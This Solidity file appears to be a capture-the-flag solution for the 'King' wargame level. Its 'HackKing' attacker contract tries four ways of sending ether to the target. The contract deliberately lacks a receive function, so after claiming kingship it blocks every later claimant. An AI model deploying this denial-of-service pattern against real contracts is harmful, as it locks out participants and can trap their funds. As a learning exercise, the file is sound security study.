// SPDX-License-Identifier: MIT
pragma solidity 0.8.10;

import "./King.sol";
import "hardhat/console.sol";

contract HackKing {
    modifier logGas() {
        uint256 u0 = gasleft();
        _;
        uint256 u1 = gasleft();
        uint256 diff = u0 - u1;
        console.log("Gas spent: ", diff);
    }

    address payable private _kingAddress;

    King _king;

    constructor(address kingAddress) payable {
        _kingAddress = payable(kingAddress);
    }

    // ✅ Works - no available receive or fallback payable function in this contract
    function callValueEther() external payable logGas {
        // 📖 https://docs.soliditylang.org/en/v0.8.15/types.html#members-of-addresses
        // 👉 .gas() - gas limit
        // 👉 .value() - ether amount
        // 👉 return true if succeed - no exceptions are thrown
        (bool success, ) = _kingAddress.call{value: msg.value}("");
        require(success);
    }

    // ❌ Fail
    function selfDestructEther() external payable logGas {
        // 📖 https://docs.soliditylang.org/en/develop/units-and-global-variables.html#contract-related
        // 👉 the receiving contract’s receive function is not executed.
        selfdestruct(_kingAddress);
    }

    // ❌ Fail
    function sendEther() external payable logGas {
        // 📖 https://docs.soliditylang.org/en/v0.8.15/types.html#members-of-addresses
        // 📖 https://docs.soliditylang.org/en/v0.8.15/units-and-global-variables.html#members-of-address-types
        // 📖 https://docs.soliditylang.org/en/v0.8.15/contracts.html#receive-ether-function
        // 👉 2300 gas limit
        // 👉 return true if succeed - no exceptions are thrown
        require(_kingAddress.send(msg.value));
    }

    // ❌ Fail
    function transferEther() external payable logGas {
        // 📖 https://docs.soliditylang.org/en/v0.8.15/types.html#members-of-addresses
        // 📖 https://docs.soliditylang.org/en/v0.8.15/units-and-global-variables.html#members-of-address-types
        // 📖 https://docs.soliditylang.org/en/v0.8.15/contracts.html#receive-ether-function
        // 👉 2300 gas limit
        // 👉 throws exception
        _kingAddress.transfer(msg.value);
    }
}
